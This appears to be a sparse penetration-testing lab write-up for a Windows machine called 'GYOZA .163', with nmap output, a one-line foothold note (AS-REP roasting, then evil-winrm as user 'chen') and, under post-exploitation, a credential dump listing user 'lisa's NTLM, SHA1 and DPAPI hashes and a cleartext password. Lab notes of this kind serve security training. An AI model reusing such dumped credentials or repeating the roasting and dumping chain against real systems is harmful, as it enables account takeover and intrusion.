# GYOZA .163

## Enumeration

```
Nmap scan report for 192.168.225.163
Host is up (0.044s latency).
Not shown: 64844 closed tcp ports (reset), 676 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Ports

Port specific enumeration&#x20;

### Local Users

## Initial Foothold

evil-winrm access as user 'chen' after asreproasting DC02

## PrivEsc



## Post Exploitation

```
Authentication Id : 0 ; 325628 (00000000:0004f7fc)
Session           : Service from 0
User Name         : lisa
Domain            : sub
Logon Server      : DC02
Logon Time        : 2/20/2025 11:02:25 PM
SID               : S-1-5-21-4168247447-1722543658-2110108262-1106
        msv :
         [00000003] Primary
         * Username : lisa
         * Domain   : sub
         * NTLM     : 905ae9b4d957545fb7b9ea0c4333247b
         * SHA1     : 469cc5a177cf467cc0bd5759ef046155c7434ce7
         * DPAPI    : d6dd3ca4075a7884d2cad98a6cea83c0
        tspkg :
        wdigest :
         * Username : lisa
         * Domain   : sub
         * Password : LisaWayToGo456
        kerberos :
         * Username : lisa
         * Domain   : SUB.POSEIDON.YZX
         * Password : LisaWayToGo456

```
